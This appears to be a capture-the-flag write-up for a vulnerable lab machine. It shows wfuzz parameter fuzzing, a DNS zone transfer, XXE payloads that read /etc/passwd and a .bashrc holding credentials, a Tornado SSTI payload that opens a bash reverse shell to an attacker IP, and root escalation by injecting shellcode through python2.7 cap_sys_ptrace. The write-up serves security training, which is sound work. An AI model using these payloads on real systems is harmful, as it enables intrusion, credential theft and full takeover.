Skills:

- Web Enumeration
- Information Leakage
- Fuzzing GET parameter - Wfuzz (Range Payload)
- Subdomain Enumeration (dig)
- XXE (XML External Entity Injection) Attack
- XXE + Base64 Wrapper in order to read .bashrc
- SSTI (Server Side Template Injection - Tornado Injection (RCE)
- Abusing Capabilities (Python2.7 cap_sys_ptrace+ep) - Injecting BIND TCP shellcode into root process [Privilege Escalation]

While checking the website, I came across a hint that said, "More you will DIG me,more you will find me on your servers..DIG me more...DIG me more" DIG is a network admin tool used for querying DNS servers.

Upon inspecting the source code, I found another clue: 'TO DO: Use a GET parameter, page_no, to view pages.' If we utilize this parameter by visiting '192.168.0.00/?page_no=1,' we receive the message 'Oh Man !! Isn't is right to go a little deep inside?' This might be a rabbit hole, 
```
192.168.0.00/?page_no=1
```

We can further investigate by fuzzing this parameter using 'wfuzz':
```
❯ wfuzz --hh=3654 -z range,1-10000 'http://192.168.0.112/?page_no=FUZZ'
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000021:   200        116 L    310 W      3849 Ch     "21" 
```

The key number we are looking for is 21. Once we access it on the website, we encounter another message: 'I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!  Out of my many homes...one such home..one such home for me : hackers.blackhat.local" 
that give us a subdomain name so we can save it in our hosts file
When we check the domain on the website, it shows a forbidden state.
As the port 53  is open, we can use the dig tool to make dns requests and execute a domain zone transfer attack

```
❯ dig @192.168.112 blackhat.local axfr
blackhat.local.		10800	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
```

In this way we obtain another subdomain and we save it.
Checking this subdomain we can create an account, we use burpsuit to intercept the request.
It's an xml structure, we can execute an XXE vulnerability https://portswigger.net/web-security/xxe

``` xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> --> user saket
<email> &xxe;</email>
saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash
-------------------------------

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc"> ]> --> bashrc file
<email> &xxe;</email>
#Setting Password for running python app
username="admin"
password="Saket!#$%@!!"

```

Exploiting the XXE vulnerability, we obtained credentials stored in the bashrc file of the user Saket

We use these credentials in a python application On port 9999 
``` xml
username="saket"
password="sdfasd"
```

This application use Tornado that is a python web framework and we can exploit it through  code execution via SSTI https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python
``` xml
http://192.168.0.112:9999/?name={{7+7}} --> payload
http://192.168.0.112:9999/?name={% import os %}{{os.system('whoami')}}

# now get a reverse shell
#on my machine 
nc -nlvp 1234

#on site
http://192.168.0.112:9999/?name={% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.0.100/1234 0>&1"')}}
```


IN this way we gain access to the victim machine
Escalate privilege

``` bash
> find / -perm -4000 2>/dev/null --> nothing
> getcap -r / 
> export PATH=/usr/sbin:/sbin/usr/bin:/bin

>saket@ubuntu:/$ getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

> getcap -r / 2>/dev/null --> python --> cap_sys_ptrace+ep --> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace

> ps -faux | grep apache --> pid
> use the python script from hacktricks --> use the apache pid
saket@ubuntu:/tmp$ python2.7 cap_sys.py 769
Instruction Pointer: 0x7f162a8660daL
Injecting Shellcode at: 0x7f162a8660daL
Shellcode Injected!!
Final Instruction Pointer: 0x7f162a8660dcL

> nc 192.168.0.000 5600 --> gained access as root
> root@ubuntu:/root# whoami
whoami
root

```